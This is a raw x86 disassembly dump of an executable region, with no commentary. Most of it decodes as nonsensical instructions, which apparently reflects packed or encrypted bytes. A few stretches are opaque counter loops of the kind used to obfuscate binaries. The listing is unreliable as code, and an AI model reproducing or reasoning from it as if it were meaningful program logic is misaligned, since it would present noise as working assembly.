  40827d:	mov    edx,0x9871f1ca
  408282:	in     eax,dx
  408283:	cmp    ebp,ebx
  408285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408286:	mov    ebp,DWORD PTR [edx+esi*4]
  408289:	push   esi
  40828a:	mov    ?,WORD PTR [esi]
  40828c:	mov    edx,0xf3f68db2
  408291:	scas   eax,DWORD PTR es:[edi]
  408292:	adc    ebp,eax
  408294:	sahf   
  408295:	pop    eax
  408296:	sbb    ebx,DWORD PTR [esi-0xb]
  408299:	jl     0x408305
  40829b:	pushf  
  40829c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40829d:	and    ah,al
  40829f:	mov    WORD PTR [eax-0xc],?
  4082a2:	(bad)
  4082a7:	dec    ebx
  4082a8:	lock mov esp,0x3c7e795a
  4082ae:	dec    ecx
  4082af:	push   esi
  4082b0:	and    eax,0xb27a0859
  4082b5:	or     DWORD PTR [eax-0x49],esi
  4082b8:	sti    
  4082b9:	xlat   BYTE PTR ds:[ebx]
  4082ba:	jl     0x408261
  4082bc:	push   ds
  4082bd:	adc    ch,BYTE PTR [ebx+0x572d146f]
  4082c3:	xor    ebp,esi
  4082c5:	or     esi,esp
  4082c7:	repz add ch,BYTE PTR [ecx]
  4082ca:	pop    esp
  4082cb:	jo     0x408281
  4082cd:	or     ch,bl
  4082cf:	pushf  
  4082d0:	mov    edx,0x3d530073
  4082d5:	mov    al,0xbe
  4082d7:	mov    ah,0x42
  4082d9:	imul   ebx,DWORD PTR [esi+0x41],0xf58a0915
  4082e0:	mov    ecx,ds
  4082e2:	pop    esi
  4082e3:	push   0xd9bdd317
  4082e8:	xchg   ebx,eax
  4082e9:	lods   eax,DWORD PTR ds:[esi]
  4082ea:	or     esi,DWORD PTR [ebx+0x7b]
  4082ed:	dec    eax
  4082ee:	sbb    BYTE PTR [esi],ah
  4082f0:	leave  
  4082f1:	icebp  
  4082f2:	mov    bh,0xae
  4082f4:	test   DWORD PTR [ebx+0x18],ebp
  4082f7:	push   0x4e
  4082f9:	push   ebp
  4082fa:	pop    esi
  4082fb:	aas    
  4082fc:	pop    es
  4082fd:	mov    bl,0xa6
  4082ff:	pop    ebp
  408300:	mov    ?,ebp
  408302:	unpckhps xmm1,XMMWORD PTR [bp+0x2a]
  408307:	mov    ecx,0x38b3a670
  40830c:	xchg   DWORD PTR [eax+0x5fabf6ec],ebp
  408312:	push   es
  408313:	call   0xe4ef5bfd
  408318:	pop    edi
  408319:	(bad)  
  40831a:	stc    
  40831b:	jns    0x4082ba
  40831d:	dec    esp
  40831e:	xchg   edi,eax
  40831f:	jp     0x4082b1
  408321:	add    al,0xe8
  408323:	(bad)  
  408324:	jns    0x408379
  408326:	push   edi
  408327:	sbb    ecx,ecx
  408329:	leave  
  40832a:	pop    edi
  40832b:	lahf   
  40832c:	mov    edx,0x36d942e1
  408331:	mul    ebx
  408333:	pop    ecx
  408334:	xchg   esp,eax
  408335:	pop    esi
  408336:	xor    ecx,DWORD PTR [esi+0x3d35bbf2]
  40833c:	cmp    al,0xd5
  40833e:	fs mov edi,0xfabc7ffb
  408344:	xchg   edi,eax
  408345:	rcl    DWORD PTR [esi],0x2b
  408348:	frstor [ebp+0x54549412]
  40834e:	add    DWORD PTR [eax+eax*8+0xd],0xffffffb9
  408353:	adc    DWORD PTR [ebx],esi
  408355:	ret    0x323d
  408358:	or     ecx,edx
  40835a:	imul   ecx,DWORD PTR [edi],0xffef7e84
  408360:	dec    DWORD PTR [ebx+0x81f045]
  408366:	add    al,0x35
  408368:	inc    eax
  408369:	pop    es
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x4345ef,0x17
  408394:	cmp    DWORD PTR ds:0x4345ef,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x4345ef,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x434653
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x4345ef,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x4345ef
  4083da:	dec    eax
  4083db:	mov    ds:0x4345ef,eax
  4083e0:	mov    eax,ds:0x4345ef
  4083e5:	dec    eax
  4083e6:	mov    ds:0x4345ef,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434713
  4083f7:	sbb    DWORD PTR ds:0x434603,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434687,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434683
  408413:	sbb    DWORD PTR ds:0x434713,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	and    ebp,DWORD PTR [eax+ebx*4]
  40842e:	nop
  40842f:	sti    
  408430:	fidivr WORD PTR [esi+0x7e]
  408433:	loope  0x4084ad
  408435:	jle    0x4084b5
  408437:	pop    esi
  408438:	hlt    
  408439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40843a:	pop    eax
  40843b:	pop    ebp
  40843c:	or     al,0xa0
  40843e:	add    DWORD PTR [ebx],edi
  408440:	sbb    esi,eax
  408442:	xchg   BYTE PTR [ebx],ch
  408444:	pop    edi
  408445:	and    BYTE PTR [edi+edi*1-0x73],dh
  408449:	addr16 ss push eax
  40844c:	xor    eax,0x1fd880cc
  408451:	push   ebp
  408452:	xor    eax,0x5bb7a794
  408457:	push   esp
  408458:	jge    0x4084a6
  40845a:	push   es
  40845b:	pop    ecx
  40845c:	push   edi
  40845d:	xor    al,0x54
  40845f:	inc    edi
  408460:	adc    BYTE PTR [eax+0xd],0xbf
  408464:	dec    ebp
  408465:	sbb    eax,0xb6106203
  40846a:	push   0x8efc82e1
  40846f:	mov    ch,BYTE PTR [ebx-0x602ef7a8]
  408475:	cmp    al,0x8f
  408477:	sub    edx,DWORD PTR [edx+eiz*1-0x3fcb3719]
  40847e:	push   0x74f82e97
  408483:	fidiv  WORD PTR [esi-0x4bd6499e]
  408489:	addr16 cld 
  40848b:	and    edi,edx
  40848d:	pop    eax
  40848e:	push   0xfb89f7b3
  408493:	mov    edx,0x52542952
  408498:	mov    ds:0x320bd8a5,eax
  40849d:	jp     0x40850b
  40849f:	cwde   
  4084a0:	aam    0xe7
  4084a2:	sahf   
  4084a3:	rcl    DWORD PTR ds:[esi],1
  4084a6:	pop    edi
  4084a7:	xchg   edi,eax
  4084a8:	sahf   
  4084a9:	add    DWORD PTR [ecx-0x14],ebx
  4084ac:	push   ebp
  4084ad:	pushf  
  4084ae:	out    dx,eax
  4084af:	jns    0x4084c0
  4084b1:	dec    ecx
  4084b2:	int3   
  4084b3:	mov    dh,0x42
  4084b5:	aam    0x9e
  4084b7:	mov    ebp,DWORD PTR [edx+edx*2]
  4084ba:	pop    ebx
  4084bb:	sub    BYTE PTR [eax+ebx*4-0x320d8331],bl
  4084c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084c3:	adc    al,0xe3
  4084c5:	mov    ecx,ecx
  4084c7:	xor    BYTE PTR [eax-0x88cc6f1],0xf9
  4084ce:	jl     0x4084cf
  4084d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084d1:	shrd   DWORD PTR [esi+0x6d575f16],ebx,cl
  4084d8:	xor    DWORD PTR gs:[eax],ebx
  4084db:	addr16 adc bh,al
  4084de:	in     eax,0x51
  4084e0:	popa   
  4084e1:	ror    BYTE PTR ds:0xdb7f5073,0x93
  4084e8:	jae    0x4084b0
  4084ea:	add    ecx,edx
  4084ec:	push   esi
  4084ed:	push   0x55e86728
  4084f2:	dec    esp
  4084f3:	add    eax,0x6b6d150e
  4084f8:	gs ins DWORD PTR es:[edi],dx
  4084fa:	mov    al,ds:0xf9c431d1
  4084ff:	adc    bh,BYTE PTR [edi+0xe]
  408502:	lods   al,BYTE PTR ds:[esi]
  408503:	clc    
  408504:	add    DWORD PTR [edx+0x6a5a02b3],0xe9fee0f2
  40850e:	mov    cl,0x2c
  408510:	pop    edx
  408511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408512:	mov    ebx,0x87f3bb72
  408517:	pop    eax
  408518:	js     0x4084e3
  40851a:	mov    esi,0xcf97b2b8
  40851f:	rol    ebx,1
  408521:	loopne 0x408589
  408523:	mov    al,0x1c
  408525:	sbb    ebx,ebx
  408527:	std    
  408528:	dec    edx
  408529:	loope  0x4084bc
  40852b:	pusha  
  40852c:	arpl   WORD PTR [ebx+0x7c6c2f03],ax
  408532:	retf   
  408533:	jg     0x4084b6
  408535:	test   bh,cl
  408537:	neg    DWORD PTR [edi-0x17]
  40853a:	test   dh,0x79
  40853d:	std    
  40853e:	push   ecx
  40853f:	adc    eax,0xd018e0f
  408544:	sbb    BYTE PTR ss:[eax-0x6353791c],0xd7
  40854c:	add    al,0x56
  40854e:	inc    bp
  408550:	es inc ebx
  408552:	adc    DWORD PTR [ebp-0x1a9f5005],edi
  408558:	jmp    0xbff7:0xa39a0d70
  40855f:	out    dx,al
  408560:	sahf   
  408561:	pop    es
  408562:	or     al,0x72
  408564:	arpl   WORD PTR [edi+0x50],bx
  408567:	cmc    
  408568:	jbe    0x4085af
  40856a:	call   0x7da85b3
  40856f:	xlat   BYTE PTR ds:[ebx]
  408570:	or     DWORD PTR [esi+0x78],esi
  408573:	outs   dx,BYTE PTR ds:[esi]
  408574:	ss adc al,bl
  408577:	ja     0x4085df
  408579:	hlt    
  40857a:	mov    BYTE PTR [ebx+0x67],ch
  40857d:	dec    edx
  40857e:	push   edi
  40857f:	inc    edx
  408580:	jecxz  0x4085bd
  408582:	jnp    0x4085d8
  408584:	mov    edi,0x61b3c27b
  408589:	cs sbb eax,0x279764b7
  40858f:	hlt    
  408590:	mov    edx,0xeb9ec7b0
  408595:	std    
  408596:	adc    cl,BYTE PTR [esp+ecx*4-0x3589fa3f]
  40859d:	and    DWORD PTR [esp+eax*8+0x380544ca],0x813a682f
  4085a8:	dec    eax
  4085a9:	sar    DWORD PTR [ecx+ebx*8-0x69],cl
  4085ad:	sbb    dh,BYTE PTR [esi]
  4085af:	dec    ebx
  4085b0:	nop
  4085b1:	popa   
  4085b2:	inc    edx
  4085b3:	ds neg dh
  4085b6:	cwde   
  4085b7:	ins    BYTE PTR es:[edi],dx
  4085b8:	xor    BYTE PTR [eax-0x297ed72b],bl
  4085be:	je     0x408543
  4085c0:	and    edx,DWORD PTR [ecx+0x32e2e913]
  4085c6:	bound  esp,QWORD PTR [ecx+0x6ff2da4a]
  4085cc:	mov    eax,0xcc20d66
  4085d1:	jbe    0x40856d
  4085d3:	adc    ebx,esp
  4085d5:	sbb    al,0xd7
  4085d7:	ds add eax,0x4830a39
  4085dd:	(bad)  
  4085de:	jle    0x40858c
  4085e0:	je     0x4085dd
  4085e2:	mov    eax,ds:0x6e44fba8
  4085e7:	xor    edi,0x98b47be2
  4085ed:	sti    
  4085ee:	test   eax,0xe714c718
  4085f3:	pushf  
  4085f4:	add    cl,BYTE PTR [ecx+eax*1+0x1fbb5f38]
  4085fb:	enter  0x55c8,0xbf
  4085ff:	iret   
  408600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408601:	cli    
  408602:	(bad)  
  408603:	add    eax,0xb3026970
  408608:	nop
  408609:	adc    ecx,DWORD PTR [ebx+0x509a31e5]
  40860f:	mov    ds:0xdacf817b,eax
  408614:	xchg   ecx,eax
  408615:	cmp    al,0x5d
  408617:	jno    0x408606
  408619:	push   0x1fafa287
  40861e:	scas   eax,DWORD PTR es:[edi]
  40861f:	or     al,0x32
  408621:	addr16 call 0x36dc086
  408627:	sti    
  408628:	mov    ds:0x38f78537,eax
  40862d:	push   es
  40862e:	cwde   
  40862f:	test   eax,0xc83a2191
  408634:	lods   al,BYTE PTR ds:[esi]
  408635:	repz into 
  408637:	pusha  
  408638:	pop    edx
  408639:	out    dx,eax
  40863a:	sbb    eax,0x92c7c835
  40863f:	mov    bh,0x6a
  408641:	inc    ebx
  408642:	rcl    BYTE PTR [edx-0x724b7add],cl
  408648:	adc    ebx,DWORD PTR [ecx+esi*4]
  40864b:	or     BYTE PTR [edi-0x74],0x55
  40864f:	ins    BYTE PTR es:[edi],dx
  408650:	mov    dh,0x25
  408652:	dec    DWORD PTR [ecx-0x34]
  408655:	out    dx,eax
  408656:	aaa    
  408657:	xchg   edi,eax
  408658:	fwait
  408659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40865a:	pavgb  mm4,QWORD PTR [ebp+0x551eeaf6]
  408661:	test   BYTE PTR ds:0xd5652eec,dh
  408667:	hlt    
  408668:	in     eax,dx
  408669:	or     DWORD PTR [edx+0x74],ebx
  40866c:	lfs    ebp,FWORD PTR [edx]
  40866f:	jb     0x408651
  408671:	jle    0x408654
  408673:	add    al,0x76
  408675:	fist   WORD PTR [edx]
  408677:	popa   
  408678:	retf   0x38d3
  40867b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40867c:	int    0xbd
  40867e:	dec    esp
  40867f:	popf   
  408680:	xor    eax,0x2bef98
  408685:	cmp    al,0xc6
  408687:	mov    edi,esp
  408689:	mov    ecx,0xaa4ce3db
  40868e:	push   0xc96c78ea
  408693:	test   BYTE PTR [eax+0x36],0x9d
  408697:	(bad)  
  408698:	fld    QWORD PTR [ebp-0x52e4860c]
  40869e:	fld    TBYTE PTR [esi+eax*1+0x851be8d]
  4086a5:	push   ecx
  4086a6:	pop    es
  4086a7:	and    DWORD PTR ds:0x4345ef,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x4345ef
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x4345ef,ebx
  4086be:	cmp    DWORD PTR ds:0x4345ef,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x4345ef,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x4345ef
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x4345ef,ebx
  4086f2:	cmp    DWORD PTR ds:0x4345ef,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434683
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0xc7ea3fc8
  408731:	dec    esi
  408732:	call   0x7ebf5fa5
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	lds    di,DWORD PTR [edx]
  40873e:	test   ah,ch
  408740:	popa   
  408741:	lock sar DWORD PTR [edi-0x3ad288f1],1
  408748:	fbstp  TBYTE PTR [edx]
  40874a:	int3   
  40874b:	lods   al,BYTE PTR ds:[esi]
  40874c:	test   BYTE PTR [edx-0x5a],ch
  40874f:	dec    edi
  408750:	(bad)  
  408751:	bound  esp,QWORD PTR [ebx]
  408753:	lock push ds
  408755:	jnp    0x408773
  408757:	mov    eax,ds:0x7c2c128d
  40875c:	int    0x95
  40875e:	sbb    al,0x1f
  408760:	mov    esi,0x5149fdba
  408765:	(bad)  
  408766:	in     eax,dx
  408767:	xchg   DWORD PTR [esi-0x32],ebp
  40876a:	sbb    eax,0x38c56c01
  40876f:	lods   eax,DWORD PTR ds:[esi]
  408770:	push   esp
  408771:	sub    al,0xae
  408773:	test   BYTE PTR es:[ebx-0x52],0xca
  408778:	mov    ch,0xef
  40877a:	sub    DWORD PTR [edi-0x27],edi
  40877d:	sub    edx,DWORD PTR [esi+0x7]
  408780:	arpl   WORD PTR [ebx-0x5b740cac],ax
  408786:	fdivr  QWORD PTR [edi]
  408788:	adc    DWORD PTR ds:0x4fdb2342,esi
  40878e:	cmp    DWORD PTR [edi],0xffffffa1
  408791:	loopne 0x408805
  408793:	(bad)  
  408794:	fidivr DWORD PTR [edi+0x1d99c071]
  40879a:	inc    ecx
  40879b:	popa   
  40879c:	cmp    DWORD PTR ds:0xd4c36620,0x55
  4087a3:	iret   
  4087a4:	outs   dx,BYTE PTR ds:[esi]
  4087a5:	sub    DWORD PTR [edi-0x12],ecx
  4087a8:	bswap  ebx
  4087aa:	jnp    0x4087cb
  4087ac:	cmp    dh,ah
  4087ae:	icebp  
  4087af:	pop    edi
  4087b0:	call   0xae69b4ca
  4087b5:	(bad)  
  4087b6:	jg     0x40877a
  4087b8:	xchg   esi,eax
  4087b9:	inc    ebx
  4087ba:	test   DWORD PTR [ebx],ebx
  4087bc:	adc    DWORD PTR [edi-0x604b3f1c],0xffffff94
  4087c3:	fwait
  4087c4:	scas   eax,DWORD PTR es:[edi]
  4087c5:	push   DWORD PTR [edx+eax*4]
  4087c8:	(bad)  
  4087c9:	mov    ecx,0xa75acbbe
  4087ce:	pop    ds
  4087cf:	pop    esi
  4087d0:	xchg   edx,eax
  4087d1:	xchg   ebp,eax
  4087d2:	pop    edi
  4087d3:	push   ecx
  4087d4:	pop    ss
  4087d5:	xor    al,0x2b
  4087d7:	jo     0x408777
  4087d9:	aam    0xee
  4087db:	cs shr al,0x2d
  4087df:	mov    bh,0x64
  4087e1:	pop    esi
  4087e2:	pop    ebp
  4087e3:	xchg   edi,eax
  4087e4:	jb     0x408808
  4087e6:	mov    cl,0xf3
  4087e8:	fimul  WORD PTR [ecx-0x28]
  4087eb:	xchg   ecx,eax
  4087ec:	or     al,0xc3
  4087ee:	dec    esp
  4087ef:	inc    ecx
  4087f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087f1:	jl     0x4087bd
  4087f3:	in     al,0x4c
  4087f5:	retf   
  4087f6:	mov    edx,0x5ada7ec6
  4087fb:	push   ecx
  4087fc:	and    eax,0x96b36685
  408801:	cmp    DWORD PTR [eax],0xf534a97f
  408807:	into   
  408808:	adc    ah,BYTE PTR [ebx+esi*2+0x18a6d133]
  40880f:	repz mov ebx,0xe95f6895
  408815:	aad    0x4d
  408817:	cmp    DWORD PTR [ebx],0x2b
  40881a:	iret   
  40881b:	cdq    
  40881c:	and    ebx,DWORD PTR [esi-0x899c1e3]
  408822:	push   esp
  408823:	mov    esp,0x98ebbd6d
  408828:	cmp    DWORD PTR [ebp-0x6e],edi
  40882b:	push   cs
  40882c:	jo     0x40881b
  40882e:	cmc    
  40882f:	shr    DWORD PTR [edi],cl
  408831:	or     al,0xc0
  408833:	imul   esp,DWORD PTR [esp+ebx*4],0x7e
  408837:	sub    edi,DWORD PTR [esi-0x46]
  40883a:	add    al,0x45
  40883c:	in     eax,dx
  40883d:	push   0xc8895ef7
  408842:	loop   0x4087ca
  408844:	(bad)  
  408845:	ss push edx
  408847:	std    
  408848:	les    eax,FWORD PTR [esi+0x2e]
  40884b:	add    edi,esp
  40884d:	and    al,0xff
  40884f:	dec    esp
  408850:	or     DWORD PTR [ebp+0x3b417af2],eax
  408856:	jge    0x40885f
  408858:	adc    DWORD PTR [esp+eax*8],ebx
  40885b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885c:	dec    eax
  40885d:	cmp    DWORD PTR [edx+0x41],ebp
  408860:	cwde   
  408861:	and    eax,0x33a1c02e
  408866:	sub    ah,bl
  408868:	jbe    0x4088d8
  40886a:	cdq    
  40886b:	enter  0xa32e,0x4b
  40886f:	dec    ebp
  408870:	push   0xffffffbd
  408872:	xor    DWORD PTR [eax-0x25],eax
  408875:	mov    al,0x51
  408877:	gs pop es
  408879:	mov    al,ds:0x733173e1
  40887e:	push   edi
  40887f:	das    
  408880:	pop    esp
  408881:	or     al,0x97
  408883:	push   eax
  408884:	push   0xe214122b
  408889:	sbb    BYTE PTR [esp+edx*4-0x5c],bh
  40888d:	cmp    al,0xdc
  40888f:	cmp    dl,ch
  408891:	mov    DWORD PTR [edi-0x666e4bb1],ebp
  408897:	xchg   esp,eax
  408898:	pop    es
  408899:	inc    edi
  40889a:	imul   edx,DWORD PTR [eax-0x2dec63fc],0xffffff92
  4088a1:	enter  0xdc77,0xbd
  4088a5:	pop    edx
  4088a6:	ins    DWORD PTR es:[edi],dx
  4088a7:	inc    ebp
  4088a8:	mov    ?,WORD PTR [ebx+0x44]
  4088ab:	cmp    BYTE PTR [eax-0x5d7cc5e1],0xcd
  4088b2:	imul   ebp,DWORD PTR [edi],0x882aa434
  4088b8:	jmp    0x4088cb
  4088ba:	xchg   edx,eax
  4088bb:	out    0xc9,eax
  4088bd:	jmp    0x7124067c
  4088c2:	les    ebp,FWORD PTR [ecx+0x5]
  4088c5:	xor    dh,dh
  4088c7:	mov    ds:0xea524464,al
  4088cc:	sti    
  4088cd:	inc    edx
  4088ce:	in     al,0x8d
  4088d0:	xchg   BYTE PTR [eax-0x30],dh
  4088d3:	inc    ebx
  4088d4:	dec    esi
  4088d6:	mov    bl,0x49
  4088d8:	scas   eax,DWORD PTR es:[edi]
  4088d9:	and    BYTE PTR [esp+ebx*1+0x64],0xe8
  4088de:	leave  
  4088df:	imul   esi,DWORD PTR [ebx-0x48aaf94b],0xe77dd407
  4088e9:	xor    al,0xe9
  4088eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088ec:	push   ebp
  4088ed:	or     bl,0xbb
  4088f0:	retf   0x7d9b
  4088f3:	inc    edx
  4088f4:	outs   dx,DWORD PTR ds:[esi]
  4088f5:	fstp   QWORD PTR [ebp+0x2a6b72]
  4088fb:	mov    dl,0xc3
  4088fd:	mov    ecx,0x98840ed6
  408902:	stc    
  408903:	jp     0x408933
  408905:	in     al,dx
  408906:	sar    DWORD PTR [edx+0x358c5ad9],1
  40890c:	pop    edx
  40890d:	ja     0x4088e0
  40890f:	pop    edx
  408910:	lods   eax,DWORD PTR ds:[esi]
  408911:	mov    DWORD PTR ds:0xcff2e87c,esi
  408917:	in     al,dx
  408918:	jnp    0x40895b
  40891a:	or     ecx,DWORD PTR [edi+0x42]
  40891d:	enter  0x4434,0xaa
  408921:	sbb    al,0x62
  408923:	scas   al,BYTE PTR es:[edi]
  408924:	retf   
  408925:	sbb    dl,0xf
  408928:	sbb    BYTE PTR [eax],dl
  40892a:	int    0x9f
  40892c:	sbb    DWORD PTR [edx-0x37],edx
  40892f:	mov    dh,0x38
  408931:	out    dx,eax
  408932:	jmp    0x1dc499cb
  408937:	inc    ebx
  408938:	daa    
  408939:	iret   
  40893a:	xchg   ecx,eax
  40893b:	cmp    DWORD PTR [edx+0x4a],ebx
  40893e:	movlps xmm1,QWORD PTR [eax-0x20e87080]
  408945:	retf   
  408946:	(bad)  
  408947:	movntq QWORD PTR [edi+0x58],mm0
  40894b:	push   es
  40894c:	pop    ds
  40894d:	cmp    BYTE PTR [eax+0x67864285],dh
  408953:	aaa    
  408954:	sub    eax,0x1f11a669
  408959:	and    esp,eax
  40895b:	ins    BYTE PTR es:[edi],dx
  40895c:	inc    ebp
  40895d:	(bad)  
  40895e:	outs   dx,DWORD PTR ds:[esi]
  40895f:	adc    ah,BYTE PTR [edi+0x60]
  408962:	or     ecx,DWORD PTR [ebx]
  408964:	popf   
  408965:	ret    0x7b6a
  408968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408969:	sti    
  40896a:	loope  0x4088f7
  40896c:	lods   eax,DWORD PTR ds:[esi]
  40896d:	sub    al,0xbb
  40896f:	cld    
  408970:	rcr    DWORD PTR [ebx-0x1e],1
  408973:	sbb    eax,0xe2c6b4db
  408978:	ins    DWORD PTR es:[edi],dx
  408979:	inc    esi
  40897a:	pop    ecx
  40897b:	test   eax,0xac337029
  408980:	sbb    DWORD PTR [ecx],ebp
  408982:	inc    ebp
  408983:	adc    eax,0xc28a993c
  408988:	push   eax
  408989:	xlat   BYTE PTR ds:[ebx]
  40898a:	xor    BYTE PTR [edi],ah
  40898c:	xchg   ebp,eax
  40898d:	cmp    DWORD PTR [esi+ecx*1-0x17e3e025],ebp
  408994:	push   ecx
  408995:	push   es
  408996:	mov    cl,0x54
  408998:	scas   al,BYTE PTR es:[edi]
  408999:	jne    0x408987
  40899b:	retf   0xa7f0
  40899e:	jg     0x408942
  4089a0:	inc    eax
  4089a1:	push   cs
  4089a2:	mov    ebp,DWORD PTR [ecx]
  4089a4:	out    dx,eax
  4089a5:	mov    edi,DWORD PTR [di+0x8]
  4089a9:	xor    edi,esi
  4089ab:	not    DWORD PTR ds:0x4345eb
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	and    bh,al
  4089dc:	or     edx,DWORD PTR [edx]
  4089de:	rcr    ebx,1
  4089e0:	jle    0x408a60
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	mov    WORD PTR [ecx-0x43],gs
  4089e9:	ds ss mov bl,bh
  4089ed:	pop    esi
  4089ee:	mov    ds:0xe28ec819,eax
  4089f3:	cmp    edx,DWORD PTR [ecx+eax*8-0x57]
  4089f7:	mov    esp,0x689476f0
  4089fc:	scas   eax,DWORD PTR es:[edi]
  4089fd:	clc    
  4089fe:	lahf   
  4089ff:	lea    ebx,[edi]
  408a01:	and    BYTE PTR [edx-0x74ac9fc7],ah
  408a07:	jmp    0x4089e6
  408a09:	jae    0x4089a1
  408a0b:	imul   esp,ebp,0x65d0f6a6
  408a11:	loop   0x408a8d
  408a13:	ret    0xef54
  408a16:	loope  0x408a0e
  408a18:	adc    DWORD PTR [edx-0x56aebad4],0x1e50c517
  408a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a23:	jae    0x4089c1
  408a25:	mov    WORD PTR [ecx],fs
  408a27:	add    bl,BYTE PTR [edi-0x1d]
  408a2a:	int    0x14
  408a2c:	retf   
  408a2d:	ret    0x5cb8
  408a30:	sbb    eax,0xe73ac610
  408a35:	in     al,0x42
  408a37:	call   0x1b3c:0x816d85ce
  408a3e:	nop
  408a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a40:	mov    ch,0xf8
  408a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a43:	imul   ebx,DWORD PTR [edi],0xfffffff1
  408a46:	fisttp QWORD PTR [ecx]
  408a48:	out    dx,eax
  408a49:	std    
  408a4a:	or     DWORD PTR [edi-0x51],ebx
  408a4d:	push   edi
  408a4e:	mov    eax,ds:0xfa05a7a5
  408a53:	pop    esi
  408a54:	pop    edi
  408a55:	cdq    
  408a56:	cmp    dh,BYTE PTR [ecx+esi*8+0x5]
  408a5a:	and    dh,0x8c
  408a5d:	es jno 0x408a6b
  408a60:	call   0xaede:0x9d5c6587
  408a67:	aas    
  408a68:	pop    eax
  408a69:	mov    bl,0xac
  408a6b:	jbe    0x408a6b
  408a6d:	call   0xf476a182
  408a72:	sub    al,0xc3
  408a74:	loop   0x408ad6
  408a76:	icebp  
  408a77:	or     DWORD PTR [eax-0x245b4eb1],eax
  408a7d:	retf   
  408a7e:	xchg   ebx,eax
  408a7f:	loope  0x408a72
  408a81:	test   eax,0x6d34f4a6
  408a86:	repnz aam 0xa2
  408a89:	xor    esi,DWORD PTR [edi]
  408a8b:	test   eax,0xb6d09d23
  408a90:	std    
  408a91:	aad    0xd6
  408a93:	mov    ds,WORD PTR [ebx+eiz*4-0x3b21c93d]
  408a9a:	jns    0x408aa1
  408a9c:	push   es
  408a9d:	outs   dx,BYTE PTR ds:[esi]
  408a9e:	lock cdq 
  408aa0:	pop    eax
  408aa1:	push   esi
  408aa2:	les    eax,FWORD PTR [esi+0x40]
  408aa5:	jge    0x408aa2
  408aa7:	icebp  
  408aa8:	adc    bh,bl
  408aaa:	and    eax,0xdf11a360
  408aaf:	ins    DWORD PTR es:[edi],dx
  408ab0:	adc    eax,DWORD PTR [eax]
  408ab2:	mov    edx,0x4b2b1e21
  408ab7:	enter  0x1cac,0x87
  408abb:	jl     0x408b36
  408abd:	mov    dh,0x18
  408abf:	pop    esi
  408ac0:	rcl    dh,1
  408ac2:	jmp    0xf0de:0xa83de41c
  408ac9:	into   
  408aca:	sbb    eax,0xcf808d40
  408acf:	je     0x408a52
  408ad1:	adc    al,0x26
  408ad3:	(bad)  
  408ad4:	and    DWORD PTR [edi-0x4bff571c],ebp
  408ada:	div    BYTE PTR [ecx-0x6b]
  408add:	stos   BYTE PTR es:[edi],al
  408ade:	in     eax,0x99
  408ae0:	in     al,0x17
  408ae2:	push   ecx
  408ae3:	stos   DWORD PTR es:[edi],eax
